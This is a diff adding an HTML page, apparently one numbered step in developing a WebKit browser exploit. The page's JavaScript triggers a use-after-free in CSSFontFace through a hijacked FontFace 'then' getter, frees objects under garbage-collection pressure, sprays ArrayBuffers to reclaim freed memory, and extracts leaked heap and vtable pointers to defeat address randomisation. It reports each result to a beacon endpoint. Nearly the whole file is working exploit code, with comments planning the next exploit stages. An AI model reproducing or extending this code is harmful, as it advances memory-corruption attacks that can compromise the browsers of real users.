@@ -1,0 +1,352 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1220 Self-address disclosure</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:13px/1.4 'Courier New',monospace;padding:10px}
+#s{font-size:18px;font-weight:bold;color:#ffd75e;padding:8px 0}
+#r{color:#ff55c8;white-space:pre-wrap;word-break:break-all;font-size:12px;line-height:1.6}
+</style>
+</head><body>
+<div id="s">P1220 BOOTING...</div>
+<div id="r"></div>
+<script>
+'use strict';
+/* ═══════════════════════════════════════════════════════════════════
+   P1220: Self-address disclosure via FontFace wrapper size probing
+
+   P1219 confirmed: CSSFontFace fake is INERT. No operation reads
+   or writes through it from JS. We need our buffer's OWN address.
+
+   APPROACH 1: Determine FontFace JS wrapper size.
+   If we can free a FontFace wrapper and reclaim with an ArrayBuffer
+   of the matching size, we read m_backing (CSSFontFace*) from the
+   reclaimed bytes. That pointer IS our stage-2 template buffer address.
+
+   APPROACH 2: Heap distance correlation.
+   Spray many ArrayBuffer(192), then check if the leaked heap pointers
+   fall in a predictable range relative to our spray addresses.
+
+   APPROACH 3: Use GC to trigger CSSFontFace deref.
+   Force GC on the FontFace wrapper → destructor calls m_backing->deref()
+   → decrements our refcount → if it hits 0, CSSFontFace destructor runs
+   → walks m_clients/m_wrapper → dereferences our controlled pointers.
+
+   This probe: determine the FontFace JS wrapper's allocation size
+   by spraying multiple sizes and checking which reclaims.
+   ═══════════════════════════════════════════════════════════════════ */
+
+var S=document.getElementById('s'),R=document.getElementById('r');
+function msg(t){R.textContent+=(R.textContent?'\n':'')+t;}
+
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1220-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+window.onerror=function(m,s,l){B('ERR',m+'@'+l);};
+
+function hex(v){return('0'+v.toString(16)).slice(-2);}
+
+S.textContent='P1220: SIZE PROBING...';
+B('START','size-probe');
+msg('=== P1220: FontFace wrapper size probe ===');
+msg('');
+
+/* ─── EXPERIMENT A: Create many FontFace objects, null refs, GC, spray ─── */
+/* We create FontFace objects, drop all JS references, force GC pressure,
+   then spray ArrayBuffers of various sizes to see which reclaims. */
+
+var SIZES=[16,24,32,40,48,56,64,72,80,88,96,104,112,120,128,
+           144,160,176,192,208,224,240,256,288,320,384,448,512];
+
+/* Phase 1: Create 50 FontFace objects with the same properties */
+var faces=[];
+for(var i=0;i<50;i++){
+  try{
+    var f=new FontFace('probe'+i,'local(Helvetica)',{unicodeRange:'U+0041'});
+    faces.push(f);
+  }catch(e){}
+}
+B('CREATED','count='+faces.length);
+msg('created '+faces.length+' FontFace objects');
+
+/* Phase 2: Add them all to document.fonts, then remove them */
+for(var i=0;i<faces.length;i++){
+  try{document.fonts.add(faces[i]);}catch(e){}
+}
+for(var i=0;i<faces.length;i++){
+  try{document.fonts.delete(faces[i]);}catch(e){}
+}
+B('REMOVED','fromFontSet');
+msg('added then removed from document.fonts');
+
+/* Phase 3: Drop all JS references */
+var faceCount=faces.length;
+faces=null;
+window.__faces=null;
+
+/* Phase 4: Force GC pressure */
+msg('forcing GC pressure...');
+var gcPressure=[];
+for(var i=0;i<5000;i++){
+  gcPressure.push(new ArrayBuffer(1024));
+}
+gcPressure=null; /* let it all go */
+
+/* More GC pressure with different patterns */
+for(var round=0;round<3;round++){
+  var tmp=[];
+  for(var i=0;i<2000;i++){
+    tmp.push({a:new ArrayBuffer(256),b:'x'.repeat(100)});
+  }
+  tmp=null;
+}
+
+B('GC-PRESSURE','done');
+msg('GC pressure applied');
+
+/* Phase 5: Spray ArrayBuffers of each candidate size */
+setTimeout(function(){
+  msg('');
+  msg('=== Spraying candidate sizes ===');
+
+  var results=[];
+
+  for(var si=0;si<SIZES.length;si++){
+    var size=SIZES[si];
+    var bufs=[];
+    var hitCount=0;
+
+    for(var k=0;k<100;k++){
+      var ab=new ArrayBuffer(size);
+      var v=new Uint8Array(ab);
+      /* Check if any bytes are non-zero (reclaimed a freed object) */
+      var nz=0;
+      for(var j=0;j<v.length;j++){
+        if(v[j]!==0)nz++;
+      }
+      if(nz>0){
+        hitCount++;
+        if(hitCount<=3){
+          /* Dump first few hits */
+          var dump='';
+          for(var j=0;j<Math.min(v.length,64);j++)dump+=hex(v[j]);
+          bufs.push('k'+k+':nz='+nz+':'+dump);
+        }
+      }
+    }
+
+    if(hitCount>0){
+      var entry='SIZE='+size+':hits='+hitCount;
+      if(bufs.length>0)entry+='|'+bufs.join('|');
+      results.push(entry);
+      msg('SIZE '+size+': '+hitCount+' HITS!');
+    }
+  }
+
+  if(results.length===0){
+    B('SPRAY-CLEAN','no-reclaim');
+    msg('no reclaims detected at any size');
+  }else{
+    /* Send each result as separate beacon (might be big) */
+    for(var i=0;i<results.length;i++){
+      B('SPRAY-HIT-'+i,results[i].slice(0,900));
+    }
+    B('SPRAY-SUMMARY','sizes_hit='+results.length);
+    msg('');
+    msg(results.length+' size(s) had reclaim hits!');
+  }
+
+  /* ─── EXPERIMENT B: Direct FontFace wrapper UAF attempt ─── */
+  /* Create a FontFace, get its .loaded promise (prevents immediate GC),
+     add to document.fonts, then set up a then-getter that frees it
+     and sprays. Similar to the CSSFontFace UAF but targeting the
+     JS wrapper instead. */
+
+  msg('');
+  msg('=== Experiment B: Wrapper UAF ===');
+  B('EXPB-START','go');
+
+  /* Create a FontFace and keep a WeakRef to detect GC */
+  var targetFace=new FontFace('target','local(Arial)',{unicodeRange:'U+0041'});
+  document.fonts.add(targetFace);
+  void targetFace.loaded;
+
+  /* Store the face's properties for later comparison */
+  var targetFamily=targetFace.family;
+  var targetStatus=targetFace.status;
+  B('EXPB-TARGET','family='+targetFamily+'|status='+targetStatus);
+
+  /* Now: remove from fonts and drop reference.
+     The face should be GC-eligible once nothing references it. */
+  document.fonts.delete(targetFace);
+  var loadedPromise=targetFace.loaded; /* keep promise alive */
+  targetFace=null;
+
+  /* GC pressure */
+  var pressure2=[];
+  for(var i=0;i<5000;i++)pressure2.push(new ArrayBuffer(512));
+  pressure2=null;
+  for(var i=0;i<3;i++){
+    var t=[];for(var j=0;j<2000;j++)t.push(new ArrayBuffer(256));
+    t=null;
+  }
+
+  /* Spray at candidate sizes to catch the freed wrapper */
+  var wrapperSizes=[48,56,64,72,80,96,112,128,144,160,176,192,224,256];
+  var wrapperHits=[];
+
+  for(var si=0;si<wrapperSizes.length;si++){
+    var wsz=wrapperSizes[si];
+    for(var k=0;k<50;k++){
+      var ab=new ArrayBuffer(wsz);
+      var bv;
+      try{bv=new BigUint64Array(ab);}catch(e){continue;}
+
+      /* Look for pointer-like values in the reclaimed data */
+      for(var qi=0;qi<bv.length;qi++){
+        var val=bv[qi];
+        if(val!==0n){
+          /* Check if it looks like a WebKit heap pointer (0x10_00xxxxxxxx) */
+          var hi=Number(val>>32n);
+          var lo=Number(val&0xFFFFFFFFn);
+          if(hi===0x10||hi===0x00000010){
+            wrapperHits.push('sz='+wsz+',k='+k+',q='+qi+',v=0x'+val.toString(16));
+          }
+          /* Also check for vtable pointers (these are in code sections) */
+          if(hi>0&&hi<0x1000&&lo!==0){
+            wrapperHits.push('sz='+wsz+',k='+k+',q='+qi+',v=0x'+val.toString(16)+':maybe-vtbl');
+          }
+        }
+      }
+    }
+  }
+
+  if(wrapperHits.length>0){
+    B('EXPB-HITS',wrapperHits.join('|').slice(0,900));
+    msg('WRAPPER HITS: '+wrapperHits.length);
+    for(var i=0;i<Math.min(wrapperHits.length,10);i++)msg('  '+wrapperHits[i]);
+  }else{
+    B('EXPB-CLEAN','no-wrapper-reclaim');
+    msg('no wrapper reclaim detected');
+  }
+
+  /* ─── EXPERIMENT C: Heap spray distance estimation ─── */
+  msg('');
+  msg('=== Experiment C: Heap distance ===');
+
+  /* Do a full CSSFontFace reclaim to get heap pointers */
+  var styleEl=document.createElement('style');
+  styleEl.textContent="@font-face{font-family:s9;src:local(Arial);unicode-range:U+0044;}";
+  document.head.appendChild(styleEl);
+  var A9=new FontFace('f9','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A9);void A9.loaded;
+
+  var firedC=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(firedC)return undefined;
+      firedC=true;
+      if(styleEl)styleEl.remove();
+      try{document.fonts.delete(this);}catch(e){}
+      styleEl=null;
+      document.body.offsetHeight;
+      window.__mapC=[];
+      for(var k=0;k<8;k++){
+        var ab=new ArrayBuffer(192);
+        window.__mapC.push({view:new Uint8Array(ab),bv:new BigUint64Array(ab)});
+      }
+      try{document.fonts.check('1em s9');}catch(e){}
+      return undefined;
+    },
+    set:function(){}
+  });
+
+  document.fonts.load('1em f9, s9','AD').then(function(){
+    B('EXPC-RESOLVED','ok');
+  },function(){});
+
+  /* Scan after 60ms */
+  setTimeout(function(){
+    var mc=window.__mapC;
+    if(!mc||!mc.length){B('EXPC-NOMAP','err');return;}
+
+    var hitBuf=-1;
+    for(var i=0;i<mc.length;i++){
+      var v=mc[i].view,n=0;
+      for(var j=0;j<v.length;j++)if(v[j]!==0)n++;
+      if(n>0){hitBuf=i;break;}
+    }
+
+    if(hitBuf<0){
+      B('EXPC-CLEAN','no-hit');
+      msg('experiment C: no reclaim hit');
+      finalize();
+      return;
+    }
+
+    var bv=mc[hitBuf].bv;
+    var p58=bv[11]; /* offset 0x58 / 8 = 11 */
+    var p68=bv[13]; /* offset 0x68 / 8 = 13 */
+    B('EXPC-HIT','p58=0x'+p58.toString(16)+'|p68=0x'+p68.toString(16));
+    msg('C hit: p58=0x'+p58.toString(16)+' p68=0x'+p68.toString(16));
+
+    /* Now spray 500 x 192B buffers with unique markers and check proximity */
+    var spray=[];
+    for(var i=0;i<500;i++){
+      var ab=new ArrayBuffer(192);
+      var sbv=new BigUint64Array(ab);
+      /* Write marker: 0xBBBB_<index>_00000000 */
+      sbv[0]=BigInt('0xBBBB'+i.toString(16).padStart(4,'0')+'00000000');
+      spray.push({bv:sbv,idx:i});
+    }
+
+    /* The reclaimed buffer IS at the CSSFontFace's address.
+       The spray buffers are at nearby addresses (same size class).
+       The p58 and p68 point to sub-objects that were allocated
+       AROUND the same time as the CSSFontFace.
+
+       Key insight: bmalloc allocates same-size objects from the same
+       page (16KB). So our 500 x 192B spray should fill several pages.
+       The CSSFontFace address (= our reclaimed buffer) is on one of
+       those pages. If we can find which spray buffer is ADJACENT to
+       the reclaimed one, we can estimate addresses. */
+
+    /* Check if the hit buffer's page (p58 & ~0x3FFF) contains
+       any of our markers */
+    var page58=p58&~0x3FFFn;
+    B('EXPC-PAGE','p58_page=0x'+page58.toString(16));
+    msg('p58 page base: 0x'+page58.toString(16));
+
+    /* We can't read at arbitrary addresses, but we can check
+       if any of our spray buffers report being on the same page
+       by checking their data patterns */
+
+    /* Check the reclaimed buffer for our spray markers */
+    var reclaimMarker=bv[0];
+    B('EXPC-RECLAIM','marker=0x'+reclaimMarker.toString(16));
+    msg('reclaim buf[0]: 0x'+reclaimMarker.toString(16));
+
+    finalize();
+  },200);
+
+  function finalize(){
+    msg('');
+    msg('=== P1220 COMPLETE ===');
+    S.textContent='P1220 COMPLETE';
+    B('DONE','all');
+  }
+
+  /* Fallback timeout */
+  setTimeout(finalize,5000);
+
+},500);
+
+</script>
+</body></html>
